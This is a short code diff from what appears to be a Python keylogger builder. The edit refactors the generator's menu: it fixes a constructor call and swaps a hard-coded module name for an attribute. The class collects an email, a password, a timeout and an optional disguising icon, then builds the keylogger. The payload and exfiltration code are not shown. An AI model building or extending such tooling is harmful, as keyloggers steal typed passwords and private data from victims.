@@ -13,8 +13,8 @@ class KeyloggerGenerator(ModuleUtils):
         Constructor method for the Generator class.
         Initializes the payload, mail, password, and timeout attributes.
         """
-
-        super().__init__(self)
+        super().__init__()
+        self.module   = "keylogger"
         self.payload  = ""
         self.mail     = ""
         self.password = ""
@@ -95,7 +95,7 @@ class KeyloggerGenerator(ModuleUtils):
                 self.run()
         
         elif answer == "show payloads":
-            self.list_payloads("keylogger")
+            self.list_payloads(self.module)
 
         elif answer == "generate":
             if self.payload == "":
@@ -107,7 +107,7 @@ class KeyloggerGenerator(ModuleUtils):
                 keylogger_icon = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Icon Of Keylogger (Optional): ")
                 
                 self.pipeline(
-                    module="keylogger", payload=self.payload, mail=self.mail, password=self.password, 
+                    module=self.module, payload=self.payload, mail=self.mail, password=self.password, 
                     timeout=int(self.time_out), name=keylogger_name, icon_path=keylogger_icon)
                 
                 sys.exit(1)
